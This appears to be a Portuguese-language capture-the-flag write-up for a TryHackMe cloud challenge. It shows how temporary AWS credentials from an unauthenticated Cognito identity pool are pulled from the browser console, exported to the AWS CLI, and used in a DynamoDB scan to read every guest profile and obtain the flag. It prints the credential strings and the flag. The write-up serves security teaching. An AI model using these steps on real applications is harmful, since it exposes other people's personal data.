# TryHackMe — Hackers Holiday CTF
## Level 3 — Complementary

**Categoria:** Cloud / AWS / Cognito Identity Pools / IAM Misconfiguration
**Dificuldade:** Média

---

### 🛎️ Concierge Briefing

> Lambo installed the Byte Lotus Wellness app the day she arrived — it was free, it had great reviews (written by the app, but she didn't check), and it got her a tote bag for saying yes to camera, mic, contacts, and location access. No account needed. No login screen. It just… knows things about you the moment you open it.
> That's the whole pitch: "complimentary" access, no friction, no sign-up. Something still has to be deciding what you're allowed to see, even without a login — and whatever that something is, it isn't checking very carefully.
> Your objective: find out how the app knows anything about you at all, and see what else it's willing to hand over.

---

## 🎯 Objetivo

O briefing dá uma pista técnica muito clara: um app **"sem login, sem conta"** ainda assim consegue "saber coisas sobre você" — ou seja, existe algum mecanismo de **autorização anônima/temporária** por trás dele. Em ambientes AWS, isso normalmente aponta para um **Cognito Identity Pool com acesso não autenticado (unauthenticated identity)**, que entrega credenciais temporárias da AWS diretamente para o navegador. O objetivo é encontrar essas credenciais e ver até onde elas permitem enxergar.

---

## 🔍 Passo 1 — Acessando o "Byte Lotus Wellness"

O app mencionado no briefing está hospedado como um site estático:

```
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
```

![Byte Lotus Wellness — dashboard de bem-estar gratuito](/Hacker%20Holiday%202026%20-%20THM/3º%20Level%20-%20Complimentary/images/WebSite.png)

A página se apresenta como o **"free wellness dashboard"**:

> *"No account needed — we set you up as a guest the moment you arrived."*
> *"Welcome! We don't have wellness data for you yet — check back after your first spa visit."*

O próprio nome do bucket S3 (`complimentary-wellness-app-332173347248`) já expõe o **Account ID da AWS** (`332173347248`), útil para os próximos passos.

Como o app "sabe coisas" sem exigir login, a hipótese é que ele obtém automaticamente credenciais temporárias da AWS assim que carrega — e essas credenciais podem estar visíveis no navegador.

---

## 🔍 Passo 2 — Inspecionando as credenciais no DevTools

Abrindo o **DevTools** (Console) do navegador na página do app, é possível observar o objeto global de configuração do **AWS SDK for JavaScript**:

![Credenciais AWS temporárias visíveis no console do navegador](/Hacker%20Holiday%202026%20-%20THM/3º%20Level%20-%20Complimentary/images/DevTools_Aws.png)

```javascript
AWS.config.credentials
```

O resultado mostra um objeto `CognitoIdentityCredentials` completo, incluindo:

```
accessKeyId:     "ASIAU2VYTBGYJCHU6CGM"
secretAccessKey: "YvrqfUKg6WupHB4dsvlMhzz3XEp1bgaFM2F2jh6d"
sessionToken:    "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJHMEUCIQ...(token longo)"
IdentityPoolId:  "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
RoleSessionName: "web-identity"
```

Ou seja, o app entrega **credenciais AWS reais e temporárias** para qualquer visitante, via um **Cognito Identity Pool não autenticado**, sem qualquer tipo de login. Isso confirma exatamente o que o briefing insinuava: *"something still has to be deciding what you're allowed to see, even without a login"* — e esse "algo" é um papel do IAM (`complimentary-cognito-unauth-role`) atribuído automaticamente a visitantes anônimos.

---

## 🔍 Passo 3 — Usando as credenciais via AWS CLI

Com as três credenciais em mãos (`AccessKeyId`, `SecretAccessKey`, `SessionToken`), elas foram exportadas como variáveis de ambiente para uso com o **AWS CLI**:

```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYJCHU6CGM"
export AWS_SECRET_ACCESS_KEY="YvrqfUKg6WupHB4dsvlMhzz3XEp1bgaFM2F2jh6d"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJHMEUCIQ...(token completo)"
```

![Exportando credenciais e validando identidade via AWS CLI](/Hacker%20Holiday%202026%20-%20THM/3º%20Level%20-%20Complimentary/images/AWS_Export_CLI.png)

Confirmando a identidade assumida:

```bash
aws sts get-caller-identity
```

```json
{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```

Isso confirma: o navegador de qualquer visitante assume automaticamente o papel **`complimentary-cognito-unauth-role`**, com permissões da AWS que **não deveriam** estar disponíveis a usuários anônimos.

---

## 🔍 Passo 4 — Explorando permissões: DynamoDB Scan

Com credenciais válidas em mãos, o próximo passo natural foi tentar **enumerar recursos AWS acessíveis** por esse papel. O nome do app ("Wellness", "GuestWellnessProfiles") sugere a existência de uma tabela **DynamoDB** com dados de hóspedes:

```bash
aws dynamodb scan \
  --table-name complimentary-GuestWellnessProfiles \
  --region us-east-1
```

O comando funcionou — o papel anônimo tinha permissão de **`dynamodb:Scan`** sobre a tabela inteira, retornando **todos os registros de todos os hóspedes**, não apenas os do "usuário atual":

![Resultado completo do dynamodb scan revelando a flag](/Hacker%20Holiday%202026%20-%20THM/3º%20Level%20-%20Complimentary/images/Flag.png)

Trecho relevante do JSON retornado:

```json
{
  "password": { "S": "escalation_only" },
  "location": { "S": "25.2048,55.2708" },
  "notes": {
    "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
  },
  "guest_id": { "S": "guest-vip-042" },
  "email": { "S": "vip042@hackerholidays.thm" },
  "phone": { "S": "+1-555-0100" },
  "name": { "S": "Guest VIP-042" }
}
```

O próprio campo `notes` deste item confirma a falha e entrega a flag: o papel `guest` do app de wellness consegue ler **todos os perfis da tabela**, incluindo dados de outros hóspedes (senhas, localização, telefone, e-mail), não apenas os próprios.

---

## 🚩 Flag

```
THM{fr33_app_fr33_d4t4!}
```

---

## 📝 Resumo da cadeia de investigação

1. **Briefing** → indica um app "sem login" que ainda assim "sabe coisas" sobre o hóspede.
2. **App Wellness** (bucket S3 estático) → confirma o modelo "complimentary/guest", sem tela de login.
3. **DevTools → Console** → revela que o app usa **Cognito Identity Pool não autenticado**, expondo `AccessKeyId`, `SecretAccessKey` e `SessionToken` diretamente no client-side.
4. **`aws sts get-caller-identity`** → confirma o papel assumido: `complimentary-cognito-unauth-role`.
5. **`aws dynamodb scan`** → o papel anônimo tem permissão de leitura irrestrita sobre a tabela `complimentary-GuestWellnessProfiles`.
6. **Campo `notes` de um dos itens** → contém a flag, deixada como comentário explicativo da falha.

---